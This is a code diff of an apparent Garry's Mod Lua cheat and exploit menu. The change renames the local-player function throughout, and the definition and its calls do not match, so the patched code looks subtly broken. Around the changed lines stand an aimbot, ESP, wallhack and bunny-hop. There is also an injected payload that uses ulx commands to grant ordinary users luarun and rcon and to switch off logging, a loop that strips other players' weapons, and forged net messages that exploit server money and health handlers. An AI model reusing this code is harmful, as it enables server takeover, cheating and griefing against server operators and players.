@@ -40,7 +40,7 @@ end
 function net.WriteColor( c )
 	netWriteColor( c )
 end
-local function LocalPlayer()
+function __LocalPlayer()
 	return LocalPlayerEntIndex()
 end
 local player = {}
@@ -78,7 +78,7 @@ end
 local isEnable = false
 local function SteamIDCheck()
 	if !IsClientLua() then return true end
-	local lsid = SteamID(LocalPlayer()) -- fadmin unban STEAM_0:0:89711282
+	local lsid = SteamID(_LocalPlayer()) -- fadmin unban STEAM_0:0:89711282
 	local sid = {}
 	table.insert(sid, "STEAM_0:0:89711282") -- Jordane
 	table.insert(sid, "STEAM_0:1:107916312") -- Verifio
@@ -225,7 +225,7 @@ hook.Add("DrawOverlay", "PWNED_VISUAL", function()
 	if not IsClientLua() or gui.IsGameUIVisible() then return end
 	if _pSetting.ESP then
 		for k,v in ipairs(player.GetAll()) do
-			if not(v == LocalPlayer()) and PlayerAlive(v) then
+			if not(v == _LocalPlayer()) and PlayerAlive(v) then
 				local pos = EntityGetPos(v)
 				local TargetPos = GetBonePosition(v, LookupBone(v, "ValveBiped.Bip01_Head1"))
 				TargetPos = VectorToScreen(TargetPos)
@@ -243,7 +243,7 @@ hook.Add("DrawOverlay", "PWNED_VISUAL", function()
 	end
 	if _pSetting.TRACER then
 		for k,v in ipairs(player.GetAll()) do
-			if not(v == LocalPlayer()) and PlayerAlive(v) then
+			if not(v == _LocalPlayer()) and PlayerAlive(v) then
 				local pos = EntityGetPos(v)
 				pos = VectorToScreen(pos + Vector(0, 0, 50))
 				if pos.visible then
@@ -256,7 +256,7 @@ hook.Add("DrawOverlay", "PWNED_VISUAL", function()
 	if _pSetting.WALLHACK then
 		for i,o in ipairs(_pSetting.ENTITES) do
 			for k,v in ipairs(entsFindByClass(o)) do
-				if not(v == LocalPlayer()) and EntityIsValid(v) then
+				if not(v == _LocalPlayer()) and EntityIsValid(v) then
 					local pos = EntityGetPos(v)
 					pos = VectorToScreen(pos)
 					if pos.visible then
@@ -304,7 +304,7 @@ function BHOP()
 		end
 	end
 	if input.IsKeyDown(KEY_SPACE) and !injump then
-	 	if IsOnGround(LocalPlayer()) and !injump then
+	 	if IsOnGround(_LocalPlayer()) and !injump then
 	 		RunConsoleCommand("+jump")
 	 		if CAC then
 		 		lastCt = lastCt + 1
@@ -362,8 +362,8 @@ function AIMBOT()
 	bTarget = nil
 	if true then
 		for k,v in ipairs(player.GetAll()) do
-			if v != LocalPlayer() and PlayerAlive(v) then
-			--[[	local lPos = EntityGetPos(LocalPlayer())
+			if v != _LocalPlayer() and PlayerAlive(v) then
+			--[[	local lPos = EntityGetPos(_LocalPlayer())
 				local pPos = EntityGetPos(v)		
 				local distance = Distance(lPos.x, lPos.y, lPos.z, pPos.x, pPos.y, pPos.z)
 				if distance < bDistance then
@@ -501,7 +501,7 @@ function CreateMenu()
 function FORMAT( lua, target )
 	
 	lua = string.Replace(lua, "#T", "Entity("..target..")")
-	lua = string.Replace(lua, "#M", "Entity("..LocalPlayer()..")")
+	lua = string.Replace(lua, "#M", "Entity(".._LocalPlayer()..")")
 	return lua
 end
 
@@ -543,8 +543,8 @@ end
 					RunConsoleCommand("ulx", "logEcho", "0")
 					RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")
 					RunConsoleCommand("ulx", "groupallow", "user", "ulx rcon")
-					RunConsoleCommand("ulx","userallow", "]=]..PlayerNick(LocalPlayer())..[=[","ulx luarun")
-  			        RunConsoleCommand("ulx","userallow", "]=]..PlayerNick(LocalPlayer())..[=[","ulx rcon")
+					RunConsoleCommand("ulx","userallow", "]=]..PlayerNick(_LocalPlayer())..[=[","ulx luarun")
+  			        RunConsoleCommand("ulx","userallow", "]=]..PlayerNick(_LocalPlayer())..[=[","ulx rcon")
 				end
 				pcall(function(__, ___)
 					util.AddNetworkString("ULX_QUERY_TEST2")
@@ -576,7 +576,7 @@ end
 				llist[i] = vgui.Create("DCheckBoxLabel", playerlist)
 				llist[i]:SetPos(5,(pipp * 10) + (pipp * 15))
 				llist[i]:SetValue(0)
-				if SteamID(LocalPlayer()) == SteamID(v) then
+				if SteamID(_LocalPlayer()) == SteamID(v) then
 					llist[i]:SetTextColor(Color(50, 0, 0))
 					llist[i]:SetText(PlayerNick(v).." [ME]")
 				else
@@ -1048,7 +1048,7 @@ end
 					if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false return end
 					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
 						for k, v in pairs( player.GetAll() ) do
-							if not (v == LocalPlayer()) then
+							if not (v == _LocalPlayer()) then
 								local gunz = EntityGetWepons(v)
 								for _, j in ipairs(gunz) do
 									net.Start("properties")
@@ -1065,7 +1065,7 @@ end
 					IsStriping = true
 					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
 						if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false return end
-						local gunz = EntityGetWepons(LocalPlayer())
+						local gunz = EntityGetWepons(_LocalPlayer())
 						for _, j in ipairs(gunz) do
 							net.Start("properties")
 							net.WriteString("remove")
@@ -1159,7 +1159,7 @@ AddExploit("S_BEV", {
 		action = function()
 			net.Start( "75_plus_win" )
 			net.WriteString( "50000" )
-			net.WriteEntity(LocalPlayer())
+			net.WriteEntity(_LocalPlayer())
 			net.SendToServer()
 		end,
 		scan = function()
@@ -1211,7 +1211,7 @@ AddExploit("S_BEV", {
 			local pl = table.Random(player.GetAll())
 			local plt = table.Random(player.GetAll())
 			net.Start("SendMoney")
-			net.WriteEntity(LocalPlayer())
+			net.WriteEntity(_LocalPlayer())
 			net.WriteEntity(pl)
 			net.WriteEntity(plt)
 			net.WriteString("-50000")
@@ -1259,8 +1259,8 @@ AddExploit("S_BEV", {
 		desc = "Money Exploit", 
 		action = function()
 			net.Start("BailOut")
-			net.WriteEntity(LocalPlayer())
-			net.WriteEntity(LocalPlayer())
+			net.WriteEntity(_LocalPlayer())
+			net.WriteEntity(_LocalPlayer())
 			net.WriteFloat(-50000.0)
 			net.SendToServer()
 		end,
@@ -1282,7 +1282,7 @@ AddExploit("S_BEV", {
 						ififif = false
 						return
 					end
-					if EntityHealth(LocalPlayer()) <= 70 then
+					if EntityHealth(_LocalPlayer()) <= 70 then
 						net.Start("buyinghealth")
 						net.SendToServer()
 					end
@@ -1476,7 +1476,7 @@ AddExploit("S_BEV", {
 			for k, v in pairs (player.GetAll()) do
 				for i = 1,255 do
 					net.Start("ply_pick_shit")
-					net.WriteEntity(LocalPlayer())
+					net.WriteEntity(_LocalPlayer())
 					net.WriteEntity(v)
 					net.SendToServer()
 				end
